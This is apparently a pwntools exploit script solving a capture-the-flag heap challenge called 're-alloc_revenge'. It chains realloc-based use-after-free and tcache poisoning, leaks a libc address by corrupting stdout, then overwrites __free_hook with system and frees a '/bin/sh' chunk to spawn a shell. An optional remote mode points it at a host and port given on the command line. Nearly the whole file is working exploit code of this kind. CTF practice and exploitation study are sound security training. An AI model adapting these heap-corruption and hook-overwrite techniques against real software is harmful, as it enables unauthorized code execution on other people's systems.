#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('re-alloc_revenge_patched')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def alloc(idx, size, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", data)

def realloc(idx, size, data=b""):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    if data:
        io.sendafter(b":", data)

def free(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())
    
def solve():

    alloc(0, 0x38, b"A"*0x8)
    alloc(1, 0x38, b"B"*0x8)

    free(1)
    realloc(0, 0)
    realloc(0, 0x38, p16(0xb010))

    alloc(1, 0x38, b"A"*0x8)
    realloc(1, 0x18, b"A"*0x8)
    free(1)

    alloc(1, 0x38, b"\x00" * 0x1d + b"\xff")
    realloc(1, 0x58, b"\x00")
    realloc(0, 0x18, b"\x00" * 0x18)
    free(0)

    realloc(1, 0x78, b"\x00" * 0x60 + p16(0x2760))
    alloc(0, 0x58, p64(0x1800) + b"\x00" * 0x18)
    io.read(0x58)

    libc.address = u64(io.read(8)) - 0x1e6560
    info("libc base: %#x", libc.address)

    realloc(1, 0x78, b"\x00" * 0x60 + p64(libc.sym["__free_hook"] - 8))
    free(1)
    alloc(1, 0x58, b"/bin/sh\x00" + p64(libc.sym["system"]))
    free(1)

    io.interactive()    


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

